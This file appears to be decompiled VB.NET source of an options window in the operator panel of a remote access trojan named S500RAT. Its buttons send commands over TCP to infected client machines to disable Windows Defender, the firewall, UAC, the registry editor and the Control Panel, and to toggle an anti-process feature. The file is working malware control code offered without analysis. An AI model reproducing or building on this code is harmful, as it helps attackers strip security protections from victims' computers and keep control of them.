Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x02000025 RID: 37
	<DesignerGenerated()>
	Public Partial Class FormOptions
		Inherits Form

		' Token: 0x0600066E RID: 1646 RVA: 0x00036DDC File Offset: 0x00034FDC
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormOptions_Load
			AddHandler MyBase.Resize, AddressOf Me.FormOptions_Resize
			Me.FormSize = False
			Me.InitializeComponent()
		End Sub

		' Token: 0x17000299 RID: 665
		' (get) Token: 0x06000671 RID: 1649 RVA: 0x00038A63 File Offset: 0x00036C63
		' (set) Token: 0x06000672 RID: 1650 RVA: 0x00038A70 File Offset: 0x00036C70
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x1700029A RID: 666
		' (get) Token: 0x06000673 RID: 1651 RVA: 0x00038AB3 File Offset: 0x00036CB3
		' (set) Token: 0x06000674 RID: 1652 RVA: 0x00038ABD File Offset: 0x00036CBD
		Friend Overridable Property UiLabel1 As UILabel

		' Token: 0x1700029B RID: 667
		' (get) Token: 0x06000675 RID: 1653 RVA: 0x00038AC6 File Offset: 0x00036CC6
		' (set) Token: 0x06000676 RID: 1654 RVA: 0x00038AD0 File Offset: 0x00036CD0
		Private Overridable Property ClientInfo As Label

		' Token: 0x1700029C RID: 668
		' (get) Token: 0x06000677 RID: 1655 RVA: 0x00038AD9 File Offset: 0x00036CD9
		' (set) Token: 0x06000678 RID: 1656 RVA: 0x00038AE3 File Offset: 0x00036CE3
		Friend Overridable Property PictureBox1 As PictureBox

		' Token: 0x1700029D RID: 669
		' (get) Token: 0x06000679 RID: 1657 RVA: 0x00038AEC File Offset: 0x00036CEC
		' (set) Token: 0x0600067A RID: 1658 RVA: 0x00038AF8 File Offset: 0x00036CF8
		Friend Overridable Property StateWD As UILabel
			<CompilerGenerated()>
			Get
				Return Me._StateWD
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UILabel)
				Dim value2 As EventHandler = AddressOf Me.StateWD_Click
				Dim stateWD As UILabel = Me._StateWD
				If stateWD IsNot Nothing Then
					RemoveHandler stateWD.Click, value2
				End If
				Me._StateWD = value
				stateWD = Me._StateWD
				If stateWD IsNot Nothing Then
					AddHandler stateWD.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700029E RID: 670
		' (get) Token: 0x0600067B RID: 1659 RVA: 0x00038B3B File Offset: 0x00036D3B
		' (set) Token: 0x0600067C RID: 1660 RVA: 0x00038B45 File Offset: 0x00036D45
		Friend Overridable Property UiLabel18 As UILabel

		' Token: 0x1700029F RID: 671
		' (get) Token: 0x0600067D RID: 1661 RVA: 0x00038B4E File Offset: 0x00036D4E
		' (set) Token: 0x0600067E RID: 1662 RVA: 0x00038B58 File Offset: 0x00036D58
		Friend Overridable Property DisabledUAC As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._DisabledUAC
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.DisabledUAC_Click
				Dim disabledUAC As Guna2GradientButton = Me._DisabledUAC
				If disabledUAC IsNot Nothing Then
					RemoveHandler disabledUAC.Click, value2
				End If
				Me._DisabledUAC = value
				disabledUAC = Me._DisabledUAC
				If disabledUAC IsNot Nothing Then
					AddHandler disabledUAC.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170002A0 RID: 672
		' (get) Token: 0x0600067F RID: 1663 RVA: 0x00038B9B File Offset: 0x00036D9B
		' (set) Token: 0x06000680 RID: 1664 RVA: 0x00038BA5 File Offset: 0x00036DA5
		Friend Overridable Property PictureBox4 As PictureBox

		' Token: 0x170002A1 RID: 673
		' (get) Token: 0x06000681 RID: 1665 RVA: 0x00038BAE File Offset: 0x00036DAE
		' (set) Token: 0x06000682 RID: 1666 RVA: 0x00038BB8 File Offset: 0x00036DB8
		Friend Overridable Property StateUAC As UILabel
			<CompilerGenerated()>
			Get
				Return Me._StateUAC
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UILabel)
				Dim value2 As EventHandler = AddressOf Me.StateUAC_Click
				Dim stateUAC As UILabel = Me._StateUAC
				If stateUAC IsNot Nothing Then
					RemoveHandler stateUAC.Click, value2
				End If
				Me._StateUAC = value
				stateUAC = Me._StateUAC
				If stateUAC IsNot Nothing Then
					AddHandler stateUAC.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170002A2 RID: 674
		' (get) Token: 0x06000683 RID: 1667 RVA: 0x00038BFB File Offset: 0x00036DFB
		' (set) Token: 0x06000684 RID: 1668 RVA: 0x00038C05 File Offset: 0x00036E05
		Friend Overridable Property UiLabel10 As UILabel

		' Token: 0x170002A3 RID: 675
		' (get) Token: 0x06000685 RID: 1669 RVA: 0x00038C0E File Offset: 0x00036E0E
		' (set) Token: 0x06000686 RID: 1670 RVA: 0x00038C18 File Offset: 0x00036E18
		Friend Overridable Property DisabledRegistry As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._DisabledRegistry
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.DisabledRegistry_Click
				Dim disabledRegistry As Guna2GradientButton = Me._DisabledRegistry
				If disabledRegistry IsNot Nothing Then
					RemoveHandler disabledRegistry.Click, value2
				End If
				Me._DisabledRegistry = value
				disabledRegistry = Me._DisabledRegistry
				If disabledRegistry IsNot Nothing Then
					AddHandler disabledRegistry.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170002A4 RID: 676
		' (get) Token: 0x06000687 RID: 1671 RVA: 0x00038C5B File Offset: 0x00036E5B
		' (set) Token: 0x06000688 RID: 1672 RVA: 0x00038C65 File Offset: 0x00036E65
		Friend Overridable Property PictureBox5 As PictureBox

		' Token: 0x170002A5 RID: 677
		' (get) Token: 0x06000689 RID: 1673 RVA: 0x00038C6E File Offset: 0x00036E6E
		' (set) Token: 0x0600068A RID: 1674 RVA: 0x00038C78 File Offset: 0x00036E78
		Friend Overridable Property StateRegistry As UILabel

		' Token: 0x170002A6 RID: 678
		' (get) Token: 0x0600068B RID: 1675 RVA: 0x00038C81 File Offset: 0x00036E81
		' (set) Token: 0x0600068C RID: 1676 RVA: 0x00038C8B File Offset: 0x00036E8B
		Friend Overridable Property UiLabel13 As UILabel

		' Token: 0x170002A7 RID: 679
		' (get) Token: 0x0600068D RID: 1677 RVA: 0x00038C94 File Offset: 0x00036E94
		' (set) Token: 0x0600068E RID: 1678 RVA: 0x00038CA0 File Offset: 0x00036EA0
		Friend Overridable Property DisabledFirewall As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._DisabledFirewall
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.DisabledFirewall_Click
				Dim disabledFirewall As Guna2GradientButton = Me._DisabledFirewall
				If disabledFirewall IsNot Nothing Then
					RemoveHandler disabledFirewall.Click, value2
				End If
				Me._DisabledFirewall = value
				disabledFirewall = Me._DisabledFirewall
				If disabledFirewall IsNot Nothing Then
					AddHandler disabledFirewall.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170002A8 RID: 680
		' (get) Token: 0x0600068F RID: 1679 RVA: 0x00038CE3 File Offset: 0x00036EE3
		' (set) Token: 0x06000690 RID: 1680 RVA: 0x00038CED File Offset: 0x00036EED
		Friend Overridable Property PictureBox6 As PictureBox

		' Token: 0x170002A9 RID: 681
		' (get) Token: 0x06000691 RID: 1681 RVA: 0x00038CF6 File Offset: 0x00036EF6
		' (set) Token: 0x06000692 RID: 1682 RVA: 0x00038D00 File Offset: 0x00036F00
		Friend Overridable Property StateFirewall As UILabel
			<CompilerGenerated()>
			Get
				Return Me._StateFirewall
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UILabel)
				Dim value2 As EventHandler = AddressOf Me.StateFirewall_Click
				Dim stateFirewall As UILabel = Me._StateFirewall
				If stateFirewall IsNot Nothing Then
					RemoveHandler stateFirewall.Click, value2
				End If
				Me._StateFirewall = value
				stateFirewall = Me._StateFirewall
				If stateFirewall IsNot Nothing Then
					AddHandler stateFirewall.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170002AA RID: 682
		' (get) Token: 0x06000693 RID: 1683 RVA: 0x00038D43 File Offset: 0x00036F43
		' (set) Token: 0x06000694 RID: 1684 RVA: 0x00038D4D File Offset: 0x00036F4D
		Friend Overridable Property UiLabel16 As UILabel

		' Token: 0x170002AB RID: 683
		' (get) Token: 0x06000695 RID: 1685 RVA: 0x00038D56 File Offset: 0x00036F56
		' (set) Token: 0x06000696 RID: 1686 RVA: 0x00038D60 File Offset: 0x00036F60
		Friend Overridable Property DisabledControl As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._DisabledControl
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.DisabledControl_Click
				Dim disabledControl As Guna2GradientButton = Me._DisabledControl
				If disabledControl IsNot Nothing Then
					RemoveHandler disabledControl.Click, value2
				End If
				Me._DisabledControl = value
				disabledControl = Me._DisabledControl
				If disabledControl IsNot Nothing Then
					AddHandler disabledControl.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170002AC RID: 684
		' (get) Token: 0x06000697 RID: 1687 RVA: 0x00038DA3 File Offset: 0x00036FA3
		' (set) Token: 0x06000698 RID: 1688 RVA: 0x00038DAD File Offset: 0x00036FAD
		Friend Overridable Property PictureBox3 As PictureBox

		' Token: 0x170002AD RID: 685
		' (get) Token: 0x06000699 RID: 1689 RVA: 0x00038DB6 File Offset: 0x00036FB6
		' (set) Token: 0x0600069A RID: 1690 RVA: 0x00038DC0 File Offset: 0x00036FC0
		Friend Overridable Property StateControlPanel As UILabel
			<CompilerGenerated()>
			Get
				Return Me._StateControlPanel
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UILabel)
				Dim value2 As EventHandler = AddressOf Me.StateControlPanel_Click
				Dim stateControlPanel As UILabel = Me._StateControlPanel
				If stateControlPanel IsNot Nothing Then
					RemoveHandler stateControlPanel.Click, value2
				End If
				Me._StateControlPanel = value
				stateControlPanel = Me._StateControlPanel
				If stateControlPanel IsNot Nothing Then
					AddHandler stateControlPanel.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170002AE RID: 686
		' (get) Token: 0x0600069B RID: 1691 RVA: 0x00038E03 File Offset: 0x00037003
		' (set) Token: 0x0600069C RID: 1692 RVA: 0x00038E0D File Offset: 0x0003700D
		Friend Overridable Property UiLabel7 As UILabel

		' Token: 0x170002AF RID: 687
		' (get) Token: 0x0600069D RID: 1693 RVA: 0x00038E16 File Offset: 0x00037016
		' (set) Token: 0x0600069E RID: 1694 RVA: 0x00038E20 File Offset: 0x00037020
		Friend Overridable Property DisabledWD As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._DisabledWD
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.DisabledWD_Click
				Dim disabledWD As Guna2GradientButton = Me._DisabledWD
				If disabledWD IsNot Nothing Then
					RemoveHandler disabledWD.Click, value2
				End If
				Me._DisabledWD = value
				disabledWD = Me._DisabledWD
				If disabledWD IsNot Nothing Then
					AddHandler disabledWD.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170002B0 RID: 688
		' (get) Token: 0x0600069F RID: 1695 RVA: 0x00038E63 File Offset: 0x00037063
		' (set) Token: 0x060006A0 RID: 1696 RVA: 0x00038E70 File Offset: 0x00037070
		Friend Overridable Property EnabledAntiProcess As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._EnabledAntiProcess
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.EnabledAntiProcess_Click
				Dim enabledAntiProcess As Guna2GradientButton = Me._EnabledAntiProcess
				If enabledAntiProcess IsNot Nothing Then
					RemoveHandler enabledAntiProcess.Click, value2
				End If
				Me._EnabledAntiProcess = value
				enabledAntiProcess = Me._EnabledAntiProcess
				If enabledAntiProcess IsNot Nothing Then
					AddHandler enabledAntiProcess.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170002B1 RID: 689
		' (get) Token: 0x060006A1 RID: 1697 RVA: 0x00038EB3 File Offset: 0x000370B3
		' (set) Token: 0x060006A2 RID: 1698 RVA: 0x00038EBD File Offset: 0x000370BD
		Friend Overridable Property PictureBox7 As PictureBox

		' Token: 0x170002B2 RID: 690
		' (get) Token: 0x060006A3 RID: 1699 RVA: 0x00038EC6 File Offset: 0x000370C6
		' (set) Token: 0x060006A4 RID: 1700 RVA: 0x00038ED0 File Offset: 0x000370D0
		Friend Overridable Property StateAntiprocess As UILabel
			<CompilerGenerated()>
			Get
				Return Me._StateAntiprocess
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As UILabel)
				Dim value2 As EventHandler = AddressOf Me.StateAntiprocess_Click
				Dim stateAntiprocess As UILabel = Me._StateAntiprocess
				If stateAntiprocess IsNot Nothing Then
					RemoveHandler stateAntiprocess.Click, value2
				End If
				Me._StateAntiprocess = value
				stateAntiprocess = Me._StateAntiprocess
				If stateAntiprocess IsNot Nothing Then
					AddHandler stateAntiprocess.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170002B3 RID: 691
		' (get) Token: 0x060006A5 RID: 1701 RVA: 0x00038F13 File Offset: 0x00037113
		' (set) Token: 0x060006A6 RID: 1702 RVA: 0x00038F1D File Offset: 0x0003711D
		Friend Overridable Property UiLabel3 As UILabel

		' Token: 0x170002B4 RID: 692
		' (get) Token: 0x060006A7 RID: 1703 RVA: 0x00038F26 File Offset: 0x00037126
		' (set) Token: 0x060006A8 RID: 1704 RVA: 0x00038F30 File Offset: 0x00037130
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x170002B5 RID: 693
		' (get) Token: 0x060006A9 RID: 1705 RVA: 0x00038F39 File Offset: 0x00037139
		' (set) Token: 0x060006AA RID: 1706 RVA: 0x00038F43 File Offset: 0x00037143
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x170002B6 RID: 694
		' (get) Token: 0x060006AB RID: 1707 RVA: 0x00038F4C File Offset: 0x0003714C
		' (set) Token: 0x060006AC RID: 1708 RVA: 0x00038F56 File Offset: 0x00037156
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x170002B7 RID: 695
		' (get) Token: 0x060006AD RID: 1709 RVA: 0x00038F5F File Offset: 0x0003715F
		' (set) Token: 0x060006AE RID: 1710 RVA: 0x00038F6C File Offset: 0x0003716C
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170002B8 RID: 696
		' (get) Token: 0x060006AF RID: 1711 RVA: 0x00038FAF File Offset: 0x000371AF
		' (set) Token: 0x060006B0 RID: 1712 RVA: 0x00038FB9 File Offset: 0x000371B9
		Public Property Client As Clients

		' Token: 0x170002B9 RID: 697
		' (get) Token: 0x060006B1 RID: 1713 RVA: 0x00038FC2 File Offset: 0x000371C2
		' (set) Token: 0x060006B2 RID: 1714 RVA: 0x00038FCC File Offset: 0x000371CC
		Public Property F As FormS500

		' Token: 0x170002BA RID: 698
		' (get) Token: 0x060006B3 RID: 1715 RVA: 0x00038FD5 File Offset: 0x000371D5
		' (set) Token: 0x060006B4 RID: 1716 RVA: 0x00038FDF File Offset: 0x000371DF
		Public Property FullPath As String

		' Token: 0x170002BB RID: 699
		' (get) Token: 0x060006B5 RID: 1717 RVA: 0x00038FE8 File Offset: 0x000371E8
		' (set) Token: 0x060006B6 RID: 1718 RVA: 0x00038FF2 File Offset: 0x000371F2
		Friend Property ParentClient As Clients

		' Token: 0x060006B7 RID: 1719 RVA: 0x00038FFC File Offset: 0x000371FC
		Private Sub FormOptions_Load(sender As Object, e As EventArgs)
			Dim expression As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(DataB.InfoClient(Me.ParentClient.L)))
			Try
				Me.ClientInfo.Text = String.Concat(New String() { Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(1), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(3), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(4) })
			Catch ex As Exception
				Me.ClientInfo.Text = "Not found !"
			End Try
			Me.FormSize = True
			Me.MinimumSize = MyBase.Size
			Me.MaximumSize = MyBase.Size
		End Sub

		' Token: 0x060006B8 RID: 1720 RVA: 0x000390F4 File Offset: 0x000372F4
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Me.ParentClient.TcpClient.Connected OrElse Not Me.Client.TcpClient.Connected
				If flag Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x060006B9 RID: 1721 RVA: 0x00039160 File Offset: 0x00037360
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			ThreadPool.QueueUserWorkItem(Sub(o As Object)
				Dim client As Clients = Me.Client
				If client IsNot Nothing Then
					client.Disconnected()
				End If
				MyBase.Close()
			End Sub)
		End Sub

		' Token: 0x060006BA RID: 1722 RVA: 0x00039178 File Offset: 0x00037378
		Private Sub FormOptions_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x060006BB RID: 1723 RVA: 0x0003920C File Offset: 0x0003740C
		Private Sub DisabledWD_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.Admin
			If flag Then
				MessageBox.Show("The client is not running as an administrator so you cannot disable Windows Defender!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
			Else
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "DisabledWD"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				Me.DisabledWD.Enabled = False
			End If
		End Sub

		' Token: 0x060006BC RID: 1724 RVA: 0x00039284 File Offset: 0x00037484
		Private Sub DisabledControl_Click(sender As Object, e As EventArgs)
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Packet").AsString = "DisabledControll"
			ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			Me.DisabledControl.Enabled = False
		End Sub

		' Token: 0x060006BD RID: 1725 RVA: 0x000392D8 File Offset: 0x000374D8
		Private Sub DisabledFirewall_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.Admin
			If flag Then
				MessageBox.Show("The client is not running as an administrator so you cannot disable Windows Defender!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
			Else
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "DisabledFirewall"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				Me.DisabledFirewall.Enabled = False
			End If
		End Sub

		' Token: 0x060006BE RID: 1726 RVA: 0x00039350 File Offset: 0x00037550
		Private Sub DisabledRegistry_Click(sender As Object, e As EventArgs)
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Packet").AsString = "DisabledRegistry"
			ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			Me.DisabledRegistry.Enabled = False
		End Sub

		' Token: 0x060006BF RID: 1727 RVA: 0x000393A4 File Offset: 0x000375A4
		Private Sub DisabledUAC_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.Admin
			If flag Then
				MessageBox.Show("The client is not running as an administrator so you cannot disable UAC!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
			Else
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "DisabledUAC"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				Me.DisabledUAC.Enabled = False
			End If
		End Sub

		' Token: 0x060006C0 RID: 1728 RVA: 0x0003941C File Offset: 0x0003761C
		Private Sub EnabledAntiProcess_Click(sender As Object, e As EventArgs)
			Dim msgPack As MsgPack = New MsgPack()
			Dim flag As Boolean = Operators.CompareString(Me.EnabledAntiProcess.Text, "Enabled", False) = 0
			If flag Then
				msgPack.ForcePathObject("Packet").AsString = "AntiProcessEnabled"
			Else
				msgPack.ForcePathObject("Packet").AsString = "AntiProcessDisabled"
			End If
			ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			Me.EnabledAntiProcess.Enabled = False
		End Sub

		' Token: 0x060006C1 RID: 1729 RVA: 0x000394A8 File Offset: 0x000376A8
		Private Sub StateWD_Click(sender As Object, e As EventArgs)
			Me.StateWD.Text = "..."
			Me.StateWD.ForeColor = Color.FromArgb(141, 152, 155)
		End Sub

		' Token: 0x060006C2 RID: 1730 RVA: 0x000394DC File Offset: 0x000376DC
		Private Sub StateAntiprocess_Click(sender As Object, e As EventArgs)
			Me.StateAntiprocess.Text = "..."
			Me.StateAntiprocess.ForeColor = Color.FromArgb(141, 152, 155)
		End Sub

		' Token: 0x060006C3 RID: 1731 RVA: 0x00039510 File Offset: 0x00037710
		Private Sub StateControlPanel_Click(sender As Object, e As EventArgs)
			Me.StateControlPanel.Text = "..."
			Me.StateControlPanel.ForeColor = Color.FromArgb(141, 152, 155)
		End Sub

		' Token: 0x060006C4 RID: 1732 RVA: 0x00039544 File Offset: 0x00037744
		Private Sub StateFirewall_Click(sender As Object, e As EventArgs)
			Me.StateFirewall.Text = "..."
			Me.StateFirewall.ForeColor = Color.FromArgb(141, 152, 155)
		End Sub

		' Token: 0x060006C5 RID: 1733 RVA: 0x00039578 File Offset: 0x00037778
		Private Sub StateUAC_Click(sender As Object, e As EventArgs)
			Me.StateUAC.Text = "..."
			Me.StateUAC.ForeColor = Color.FromArgb(141, 152, 155)
		End Sub

		' Token: 0x0400030E RID: 782
		Public Admin As Boolean

		' Token: 0x0400030F RID: 783
		Private FormSize As Boolean
	End Class
End Namespace
